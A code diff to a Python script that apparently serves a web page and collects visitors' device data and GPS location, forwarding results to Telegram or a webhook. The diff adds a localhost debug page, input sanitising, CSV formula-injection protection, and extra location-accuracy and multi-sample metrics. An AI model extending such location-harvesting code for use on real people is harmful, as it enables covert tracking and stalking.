@@ -45,6 +45,25 @@ parser.add_argument(
 parser.add_argument(
     '-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]'
 )
+parser.add_argument(
+    '-a',
+    '--admin',
+    action='store_true',
+    help='Enable local admin/debug status page (localhost only)',
+)
+parser.add_argument(
+    '-ap',
+    '--admin-port',
+    type=int,
+    default=8081,
+    help='Admin/debug status page port [ Default : 8081, localhost only ]',
+)
+parser.add_argument(
+    '-at',
+    '--admin-token',
+    help='Require this token to access the admin/debug page '
+    '[ via X-Admin-Token header or ?token= ]',
+)
 
 args = parser.parse_args()
 kml_fname = args.kml
@@ -53,6 +72,18 @@ chk_upd = args.update
 print_v = args.version
 telegram = getenv('TELEGRAM') or args.telegram
 webhook = getenv('WEBHOOK') or args.webhook
+
+admin_debug = (
+    getenv('ADMIN_DEBUG') is not None
+    and getenv('ADMIN_DEBUG') != '0'
+    and getenv('ADMIN_DEBUG', '').lower() != 'false'
+) or args.admin is True
+admin_port = (
+    int(getenv('ADMIN_PORT'))
+    if getenv('ADMIN_PORT') and getenv('ADMIN_PORT').isnumeric()
+    else args.admin_port
+)
+admin_token = getenv('ADMIN_TOKEN') or args.admin_token
 
 if (
     getenv('DEBUG_HTTP')
@@ -335,6 +366,9 @@ def data_parser():
     except decoder.JSONDecodeError:
         utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
     else:
+        # Fields below are client-supplied; strip terminal control / ANSI
+        # sequences so a crafted value cannot spoof the operator's console.
+        info_json = {k: utils.sanitize_untrusted(v) for k, v in info_json.items()}
         var_os = info_json['os']
         var_platform = info_json['platform']
         var_cores = info_json['cores']
@@ -413,6 +447,9 @@ def data_parser():
         except decoder.JSONDecodeError:
             utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')
         else:
+            result_json = {
+                k: utils.sanitize_untrusted(v) for k, v in result_json.items()
+            }
             status = result_json['status']
             if status == 'success':
                 var_lat = result_json['lat']
@@ -421,16 +458,36 @@ def data_parser():
                 var_alt = result_json['alt']
                 var_dir = result_json['dir']
                 var_spd = result_json['spd']
+                # GPS accuracy instrumentation (older payloads omit these)
+                var_acc_alt = result_json.get('acc_alt', 'Not Available')
+                var_ts = result_json.get('ts', '')
+                # Multi-sample convergence metrics (only sent when sampling)
+                var_samples = result_json.get('samples', '')
+                var_acc_best = result_json.get('acc_best', '')
+                var_acc_worst = result_json.get('acc_worst', '')
+                var_time_to_best = result_json.get('time_to_best', '')
 
-                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
+                data_row.extend(
+                    [var_lat, var_lon, var_acc, var_alt, var_dir, var_spd,
+                     var_acc_alt, var_ts, var_samples, var_acc_best,
+                     var_acc_worst, var_time_to_best]
+                )
                 loc_info = f"""{Y}[!] Location Information :{W}
 
-{G}[+] {C}Latitude  : {W}{var_lat}
-{G}[+] {C}Longitude : {W}{var_lon}
-{G}[+] {C}Accuracy  : {W}{var_acc}
-{G}[+] {C}Altitude  : {W}{var_alt}
-{G}[+] {C}Direction : {W}{var_dir}
-{G}[+] {C}Speed     : {W}{var_spd}
+{G}[+] {C}Latitude       : {W}{var_lat}
+{G}[+] {C}Longitude      : {W}{var_lon}
+{G}[+] {C}Accuracy       : {W}{var_acc}
+{G}[+] {C}Altitude       : {W}{var_alt}
+{G}[+] {C}Altitude Acc.  : {W}{var_acc_alt}
+{G}[+] {C}Direction      : {W}{var_dir}
+{G}[+] {C}Speed          : {W}{var_spd}
+{G}[+] {C}Fix Timestamp  : {W}{var_ts}
+"""
+                if var_samples:
+                    loc_info += f"""{G}[+] {C}Samples        : {W}{var_samples}
+{G}[+] {C}Best Accuracy  : {W}{var_acc_best}
+{G}[+] {C}Worst Accuracy : {W}{var_acc_worst}
+{G}[+] {C}Time to Best   : {W}{var_time_to_best}
 """
                 utils.print(loc_info)
                 send_telegram(result_json, 'location')
@@ -473,7 +530,8 @@ def kmlout(var_lat, var_lon):
 def csvout(row):
     with open(DATA_FILE, 'a') as csvfile:
         csvwriter = writer(csvfile)
-        csvwriter.writerow(row)
+        # Neutralise CSV / formula injection from client-supplied fields.
+        csvwriter.writerow([utils.csv_safe(cell) for cell in row])
     utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
 
 
@@ -499,11 +557,59 @@ def cl_quit():
     sys.exit()
 
 
+def php_status():
+    running = None
+    pid = None
+    if path.isfile(PID_FILE):
+        try:
+            with open(PID_FILE, 'r') as pid_info:
+                pid = int(pid_info.read().strip())
+            running = psutil.pid_exists(pid) and (
+                psutil.Process(pid).status() != psutil.STATUS_ZOMBIE
+            )
+        except (psutil.NoSuchProcess, ValueError, OSError):
+            running = False
+    return {'php_running': running, 'pid': pid if pid is not None else '-'}
+
+
+def start_admin_debug():
+    if not admin_debug:
+        return
+    import admin_debug as admin_debug_mod
+
+    config = {
+        'version': VERSION,
+        'php_port': port,
+        'template': SITE,
+    }
+    log_files = {
+        'php.log': LOG_FILE,
+        'results.csv': DATA_FILE,
+        'info.txt': INFO,
+        'result.txt': RESULT,
+    }
+    try:
+        admin_debug_mod.start_admin_server(
+            admin_port, config, log_files, php_status, token=admin_token
+        )
+        auth_note = 'token required' if admin_token else 'no token set'
+        utils.print(
+            f'{G}[+] {C}Admin Debug page : {W}http://127.0.0.1:{admin_port}/ '
+            f'{Y}[localhost only, {auth_note}]{W}\n'
+        )
+    except OSError as exc:
+        utils.print(
+            f'{R}[-] {C}Could not start admin debug page on port '
+            f'{W}{admin_port}{C} : {W}{exc}\n'
+        )
+
+
 try:
     banner()
     clear()
     SITE = template_select(SITE)
     server()
+    start_admin_debug()
     wait()
     data_parser()
 except KeyboardInterrupt:
